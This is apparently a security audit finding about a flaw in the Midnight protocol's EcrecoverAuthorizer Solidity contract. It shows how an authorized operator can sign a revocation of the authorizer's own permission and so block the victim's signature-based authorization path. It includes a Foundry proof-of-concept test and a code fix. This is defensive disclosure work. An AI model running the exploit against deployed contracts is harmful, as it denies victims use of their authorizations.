### Title
Authorized Operator Can Revoke EcrecoverAuthorizer's Own Midnight Authorization via Signed Delegation - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts signatures from any Midnight-authorized operator on behalf of a victim, including signatures that set `authorization.authorized = address(this)` and `authorization.isAuthorized = false`. Because `Midnight.setIsAuthorized` only checks that `msg.sender` (i.e., `address(ecrecoverAuthorizer)`) is itself authorized by `onBehalf` (the victim), and that authorization is still true at the time of the call, the revocation succeeds. After execution, `isAuthorized[victim][address(ecrecoverAuthorizer)]` is `false`, and all future `EcrecoverAuthorizer`-mediated authorization changes for the victim revert with `Unauthorized` from Midnight.

### Finding Description

**Exact code path:**

`EcrecoverAuthorizer.setIsAuthorized` (lines 33–36) checks:

```solidity
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
``` [1](#0-0) 

This allows any Midnight-authorized operator (`signer`) to sign an `Authorization` struct on behalf of `authorization.authorizer` (the victim). There is no restriction on what `authorization.authorized` or `authorization.isAuthorized` may be — including `authorized = address(this)` and `isAuthorized = false`.

After the signature check passes, the contract calls:

```solidity
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
``` [2](#0-1) 

`Midnight.setIsAuthorized` (line 732) checks:

```solidity
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
``` [3](#0-2) 

Here `msg.sender = address(ecrecoverAuthorizer)` and `onBehalf = victim`. The precondition `isAuthorized[victim][address(ecrecoverAuthorizer)] == true` satisfies this check, so the call succeeds and sets `isAuthorized[victim][address(ecrecoverAuthorizer)] = false`.

**Attacker-controlled inputs:**
- `authorization.authorizer = victim`
- `authorization.authorized = address(ecrecoverAuthorizer)`
- `authorization.isAuthorized = false`
- `authorization.nonce = nonce[victim]` (public state, readable by anyone)
- `authorization.deadline` = any future timestamp
- `signature` = operator's own ECDSA signature over the above struct

**Why existing checks fail:**
The only signer check in `EcrecoverAuthorizer` is whether the signer equals the authorizer or is Midnight-authorized by the authorizer. It does not distinguish between an operator revoking a third party versus revoking `EcrecoverAuthorizer` itself. The Midnight-level check in `setIsAuthorized` is satisfied because `ecrecoverAuthorizer` is still authorized at the moment of the call (the revocation happens inside that very call).

### Impact Explanation

After the attack, `isAuthorized[victim][address(ecrecoverAuthorizer)] == false`. Any subsequent call to `EcrecoverAuthorizer.setIsAuthorized` with `authorization.authorizer = victim` will reach `Midnight.setIsAuthorized` where `msg.sender = address(ecrecoverAuthorizer)` is no longer authorized by `victim`, causing a revert with `IMidnight.Unauthorized`. The victim's entire sig-based authorization path through `EcrecoverAuthorizer` is frozen. The victim must submit a direct on-chain transaction to `Midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim)` to recover. The operator can repeat the attack immediately after each recovery, making the griefing persistent and cheap.

### Likelihood Explanation

**Preconditions:**
1. `isAuthorized[victim][address(ecrecoverAuthorizer)] == true` — this is the normal setup state for any user who has opted into sig-based authorization via `EcrecoverAuthorizer`.
2. `isAuthorized[victim][operator] == true` — the victim has authorized at least one operator (common for protocol integrations, smart wallets, or relayer setups).

Both preconditions are the intended, documented usage pattern. The attack requires no special privileges, no capital, and no oracle manipulation. It is repeatable: the operator can re-execute after every victim recovery using the next nonce value. The nonce is public state. [4](#0-3) 

### Recommendation

In `EcrecoverAuthorizer.setIsAuthorized`, add a guard that prevents a delegated operator (i.e., `signer != authorization.authorizer`) from revoking `EcrecoverAuthorizer`'s own Midnight authorization:

```solidity
require(
    signer == authorization.authorizer ||
    !(authorization.authorized == address(this) && !authorization.isAuthorized),
    Unauthorized()
);
```

This ensures that only the authorizer themselves (signing directly) can remove `EcrecoverAuthorizer` from their Midnight authorization set, while operators retain the ability to manage all other authorization changes on the authorizer's behalf. [1](#0-0) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.34;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {EcrecoverAuthorizer, Authorization, Signature} from "src/periphery/EcrecoverAuthorizer.sol";
import {IMidnight} from "src/interfaces/IMidnight.sol";

contract OperatorRevokesEcrecoverAuthorizerTest is Test {
    Midnight midnight;
    EcrecoverAuthorizer ecrecoverAuthorizer;

    uint256 victimKey   = 0xA11CE;
    uint256 operatorKey = 0xB0B;
    address victim   = vm.addr(victimKey);
    address operator = vm.addr(operatorKey);

    function setUp() public {
        midnight = new Midnight();
        ecrecoverAuthorizer = new EcrecoverAuthorizer(address(midnight));

        // Victim sets up EcrecoverAuthorizer as their sig-based auth path
        vm.prank(victim);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);

        // Victim also authorizes operator (e.g., for relaying)
        vm.prank(victim);
        midnight.setIsAuthorized(operator, true, victim);
    }

    function testOperatorRevokesEcrecoverAuthorizer() public {
        // Preconditions hold
        assertTrue(midnight.isAuthorized(victim, address(ecrecoverAuthorizer)));
        assertTrue(midnight.isAuthorized(victim, operator));

        // Operator crafts a revocation of EcrecoverAuthorizer on behalf of victim
        Authorization memory auth = Authorization({
            authorizer:   victim,
            authorized:   address(ecrecoverAuthorizer),
            isAuthorized: false,
            nonce:        ecrecoverAuthorizer.nonce(victim), // == 0
            deadline:     block.timestamp + 1 days
        });

        bytes32 domainSeparator = keccak256(abi.encode(
            0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218,
            block.chainid,
            address(ecrecoverAuthorizer)
        ));
        bytes32 hashStruct = keccak256(abi.encode(
            0x81d0284fb0e2cde18d0553b06189d6f7613c96a01bb5b5e7828eade6a0dcac91,
            auth
        ));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operatorKey, digest);

        // Operator submits — no revert expected
        ecrecoverAuthorizer.setIsAuthorized(auth, Signature({v: v, r: r, s: s}));

        // EcrecoverAuthorizer is now revoked for victim
        assertFalse(midnight.isAuthorized(victim, address(ecrecoverAuthorizer)));

        // Victim's future sig-based authorization changes via EcrecoverAuthorizer now revert
        Authorization memory auth2 = Authorization({
            authorizer:   victim,
            authorized:   operator,
            isAuthorized: false,
            nonce:        ecrecoverAuthorizer.nonce(victim), // == 1
            deadline:     block.timestamp + 1 days
        });
        bytes32 hashStruct2 = keccak256(abi.encode(
            0x81d0284fb0e2cde18d0553b06189d6f7613c96a01bb5b5e7828eade6a0dcac91,
            auth2
        ));
        bytes32 digest2 = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct2));
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(victimKey, digest2);

        // Even a valid victim-signed authorization now reverts
        vm.expectRevert(IMidnight.Unauthorized.selector);
        ecrecoverAuthorizer.setIsAuthorized(auth2, Signature({v: v2, r: r2, s: s2}));
    }
}
```

**Expected assertions:**
- `assertFalse(midnight.isAuthorized(victim, address(ecrecoverAuthorizer)))` passes after the operator's call.
- The subsequent victim-signed `setIsAuthorized` call reverts with `IMidnight.Unauthorized`.
